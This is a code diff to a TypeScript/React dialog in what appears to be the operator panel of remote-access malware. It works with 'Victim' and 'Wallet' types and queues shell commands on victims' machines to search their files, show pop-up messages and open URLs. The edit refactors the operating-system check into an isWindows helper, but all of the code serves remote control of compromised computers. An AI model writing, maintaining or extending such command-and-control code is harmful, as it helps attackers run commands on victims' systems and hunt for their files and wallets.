@@ -9,6 +9,7 @@ import { mutate, useApi } from '@/hooks/useApi';
 import { ApiError } from '@/lib/api';
 import type { ActionDef } from '@/lib/actions';
 import type { Task, Victim, Wallet } from '@/lib/types';
+import { isWindows } from '@/lib/os';
 
 function reason(error: unknown): string {
   if (error instanceof ApiError) {
@@ -120,7 +121,7 @@ export function ParamDialog({
     setBusy('search');
     setError(null);
     setOutput('');
-    const command = victim.os === 'windows'
+    const command = isWindows(victim.os)
       ? `where /r "${base}" "*${needle}*"`
       : `find "${base}" -iname "*${needle}*"`;
     try {
@@ -182,14 +183,14 @@ export function ParamDialog({
           break;
         case 'message': {
           const escaped = message.replace(/"/g, '\\"').replace(/'/g, "''").replace(/\r?\n/g, ' ');
-          const cmd = victim.os === 'windows'
+          const cmd = isWindows(victim.os)
             ? `powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\\"${escaped}\\",\\"${title.replace(/"/g, '')}\\")"`
             : `sh -c "zenity --info --title='${title}' --text='${escaped}' 2>/dev/null || notify-send '${title}' '${escaped}'"`;
           await queue('shell', { command: cmd }, 60);
           break;
         }
         case 'open_url': {
-          const cmd = victim.os === 'windows' ? `start "" "${url}"` : `xdg-open "${url}"`;
+          const cmd = isWindows(victim.os) ? `start "" "${url}"` : `xdg-open "${url}"`;
           await queue('shell', { command: cmd }, 30);
           break;
         }
